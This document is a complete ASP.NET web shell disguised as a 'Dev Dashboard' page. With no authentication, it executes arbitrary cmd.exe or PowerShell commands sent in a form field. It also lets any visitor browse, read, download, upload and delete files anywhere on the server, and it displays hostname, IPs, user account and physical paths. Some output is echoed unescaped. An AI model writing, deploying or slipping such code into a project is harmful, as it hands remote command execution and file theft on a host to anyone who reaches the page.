<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>

<script runat="server">
string cwd = Request.QueryString["cwd"] ?? Request.Form["cwd"] ?? Server.MapPath(".");
string cmd = Request.Form["cmd"] ?? "";
string mode = Request.Form["mode"] ?? "shell";
string viewFile = null;
string viewContent = null;

// Handle directory navigation
if (!string.IsNullOrEmpty(Request.QueryString["dir"]))
{
    string newDir = Request.QueryString["dir"];
    if (Directory.Exists(newDir)) cwd = Path.GetFullPath(newDir);
}

// File actions: view
if (!string.IsNullOrEmpty(Request.QueryString["view"]))
{
    string file = Request.QueryString["view"];
    if (File.Exists(file))
    {
        viewFile = file;
        viewContent = Server.HtmlEncode(File.ReadAllText(file));
    }
}

// File delete
if (!string.IsNullOrEmpty(Request.QueryString["delete"]))
{
    string file = Request.QueryString["delete"];
    if (File.Exists(file))
    {
        File.Delete(file);
        Response.Write($"<p style='color:green;'>Deleted {file}</p>");
    }
}

// File download
if (!string.IsNullOrEmpty(Request.QueryString["download"]))
{
    string file = Request.QueryString["download"];
    if (File.Exists(file))
    {
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition", $"attachment; filename={Path.GetFileName(file)}");
        Response.WriteFile(file);
        Response.End();
    }
}

// File upload
if (FileUpload1.HasFile)
{
    string dest = Path.Combine(cwd, Path.GetFileName(FileUpload1.FileName));
    try
    {
        FileUpload1.SaveAs(dest);
        Response.Write($"<p style='color:green;'>Uploaded {Server.HtmlEncode(dest)} ({FileUpload1.PostedFile.ContentLength} bytes)</p>");
    }
    catch
    {
        Response.Write("<p style='color:red;'>Upload failed!</p>");
    }
}

// List files
List<string> ListFiles(string dir)
{
    var files = Directory.GetFileSystemEntries(dir);
    return files.ToList();
}

// System info
Dictionary<string,string> SysInfo()
{
    var info = new Dictionary<string,string>();
    info["Hostname"] = Dns.GetHostName();
    info["Server IP"] = Request.ServerVariables["LOCAL_ADDR"] ?? "Unknown";
    info["Client IP"] = Request.UserHostAddress ?? "Unknown";
    info["Current User"] = Environment.UserName;
    info["OS"] = Environment.OSVersion.ToString();
    info["Framework"] = Environment.Version.ToString();
    info["Physical Path"] = Request.PhysicalApplicationPath;
    info["Server Software"] = Request.ServerVariables["SERVER_SOFTWARE"] ?? "Unknown";
    return info;
}

// Execute command
string ExecCommand(string command, string mode)
{
    if (string.IsNullOrEmpty(command)) return "";
    try
    {
        var psi = new ProcessStartInfo();
        if (mode == "shell")
        {
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
        }
        else if (mode == "powershell")
        {
            psi.FileName = "powershell.exe";
            psi.Arguments = "-Command " + command;
        }
        else return "Unsupported mode";

        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        var proc = Process.Start(psi);
        string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
        proc.WaitForExit();
        return output;
    }
    catch (Exception ex)
    {
        return ex.Message;
    }
}

string terminalOutput = ExecCommand(cmd, mode);

</script>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Dev Dashboard</title>
<style>
  body {margin:0;font-family:"Segoe UI",sans-serif;background:#f7f9fc;color:#333;height:100vh;display:flex;flex-direction:column;}
  header {background:#3f51b5;color:#fff;padding:1rem 2rem;font-size:1.25rem;font-weight:700;box-shadow:0 2px 6px rgb(0 0 0 / 0.2);}
  main {flex:1;display:flex;gap:1rem;padding:1rem 2rem;overflow:hidden;}
  section {background:#fff;border-radius:8px;box-shadow:0 0 8px rgb(0 0 0 / 0.1);padding:1rem;overflow-y:auto;}
  #file-manager {flex:1.5;display:flex;flex-direction:column;margin:0;overflow:hidden;}
  #file-manager table {width:100%;border-collapse:collapse;}
  #file-manager th,#file-manager td {padding:0.5rem 0.75rem;text-align:left;border-bottom:1px solid #eee;font-family:monospace;}
  #file-manager th {background:#f0f0f0;user-select:none;}
  #file-manager tbody tr:hover {background:#e3eaff;}
  a.action-btn {margin-right:0.5rem;text-decoration:none;font-weight:bold;padding:0.2rem 0.4rem;border-radius:4px;color:white;font-family:"Segoe UI",sans-serif;}
  a.view {background:#2196f3;} a.download {background:#4caf50;} a.delete {background:#f44336;} a.folder {color:#fbc02d;font-weight:700;cursor:pointer;}
  #system-info {flex:0.5;margin-bottom:0.1rem;} #system-info ul {list-style:none;padding:0;font-family:monospace;} #system-info li {padding:0.3rem 0;}
  #terminal {flex:2.6;display:flex;flex-direction:column;} #terminal form {display:flex;gap:0.5rem;margin-bottom:0.5rem;}
  #terminal select,#terminal input[type="text"] {font-family:monospace;font-size:1rem;padding:0.3rem 0.5rem;border:1px solid #ccc;border-radius:4px;} #terminal input[type="text"] {flex:1;}
  #terminal button {background:#3f51b5;border:none;color:#fff;padding:0 1rem;border-radius:4px;font-weight:700;cursor:pointer;transition:0.3s;}
  #terminal button:hover {background:#303f9f;}
  #output {flex:1;background:#1e1e1e;color:#d4d4d4;font-family:monospace;padding:1rem;border-radius:6px;overflow-y:auto;white-space:pre-wrap;box-shadow:inset 0 0 5px rgba(0,0,0,0.5);}
  .fm-header {display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;gap:10px;}
  .fm-header h2 {margin:0;font-size:1.3em;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;min-width:0;}
</style>
</head>
<body>
<header>Dev Dashboard</header>
<main>
<section id="file-manager">
<div class="fm-header">
<h2>File Manager: <%= Server.HtmlEncode(cwd) %></h2>
<form method="post" enctype="multipart/form-data" style="margin:0">
<asp:FileUpload ID="FileUpload1" runat="server" />
<input type="hidden" name="cwd" value="<%= cwd %>" />
<button type="submit">Upload</button>
</form>
</div>

<div style="flex:1;overflow:auto">
<table>
<thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
<tbody>
<%
string parent = Directory.GetParent(cwd)?.FullName ?? cwd;
if(parent != cwd)
{
%>
<tr><td colspan="4"><a class="folder" href="?dir=<%= parent %>&cwd=<%= parent %>">.. (Parent Directory)</a></td></tr>
<% } 

foreach(var file in ListFiles(cwd)) 
{
    bool isDir = Directory.Exists(file);
    string size = isDir ? "Folder" : new FileInfo(file).Length.ToString("N0")+" Bytes";
    string mtime = File.GetLastWriteTime(file).ToString("yyyy-MM-dd HH:mm:ss");
%>
<tr>
<td>
<% if(isDir) { %>
<a class="folder" href="?dir=<%= file %>&cwd=<%= file %>">&#128193; <%= Path.GetFileName(file) %></a>
<% } else { %>
&#128459; <%= Path.GetFileName(file) %>
<% } %>
</td>
<td><%= size %></td>
<td><%= mtime %></td>
<td>
<% if(!isDir) { %>
<a class="action-btn view" href="?view=<%= file %>&cwd=<%= cwd %>">👁️</a>
<a class="action-btn download" href="?download=<%= file %>&cwd=<%= cwd %>">⬇️</a>
<a class="action-btn delete" href="?delete=<%= file %>&cwd=<%= cwd %>" onclick="return confirm('Delete <%= Path.GetFileName(file) %>?');">🗑️</a>
<% } else { %> - <% } %>
</td>
</tr>
<% } %>
</tbody>
</table>
</div>

<% if(viewContent != null) { %>
<div style="flex:1;display:flex;flex-direction:column;overflow:hidden;position:relative">
<hr>
<div style="display:flex;justify-content:space-between;align-items:center">
<p style="margin:0 0 10px 0;font-size:1.17em;font-weight:bold">File Viewer: <%= Path.GetFileName(viewFile) %></p>
<button onclick="navigator.clipboard.writeText(document.getElementById('file-content').innerText);alert('Copied!');" style="background:#4caf50;border:none;color:white;padding:6px 10px;border-radius:4px;cursor:pointer;font-weight:600">📋 Copy</button>
</div>
<pre id="file-content" style="background:black;color:#00ff00;padding:10px;overflow:auto;flex:1;margin:0"><%= viewContent %></pre>
</div>
<% } %>

</section>

<section style="flex:1;display:flex;flex-direction:column;gap:1rem;">
<div id="system-info">
<h2>System Info</h2>
<ul>
<%
foreach(var kv in SysInfo())
{
%>
<li><strong><%= kv.Key %>:</strong> <%= kv.Value %></li>
<% } %>
</ul>
</div>

<div id="terminal">
<h2>Interactive Terminal</h2>
<form method="post">
<select name="mode">
<option value="shell" <%= mode=="shell"?"selected":"" %>>Shell</option>
<option value="powershell" <%= mode=="powershell"?"selected":"" %>>PowerShell</option>
</select>
<input type="text" name="cmd" required />
<input type="hidden" name="cwd" value="<%= cwd %>" />
<button type="submit">Run ▶</button>
</form>
<pre id="output"><%= terminalOutput %></pre>
</div>
</section>
</main>
</body>
</html>
